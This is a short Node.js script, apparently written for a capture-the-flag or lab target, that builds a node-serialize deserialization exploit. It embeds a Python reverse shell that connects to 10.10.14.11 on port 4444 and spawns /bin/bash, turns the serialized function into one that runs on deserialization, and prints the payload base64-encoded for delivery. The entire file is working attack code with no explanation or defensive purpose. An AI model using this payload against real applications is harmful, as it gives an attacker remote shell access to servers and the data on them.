const serialize = require("node-serialize");

let payload = {
    "username": function() { require("child_process").exec(`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.11",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`, function(error, stdout, stderr) {}); return "sun"; },
    "country": "X",
    "city": "X",
    "num": "2"
};

payload = serialize.serialize(payload);
payload = JSON.parse(payload);
payload.username += "()";
payload = JSON.stringify(payload);

console.log(Buffer.from(payload).toString("base64"));
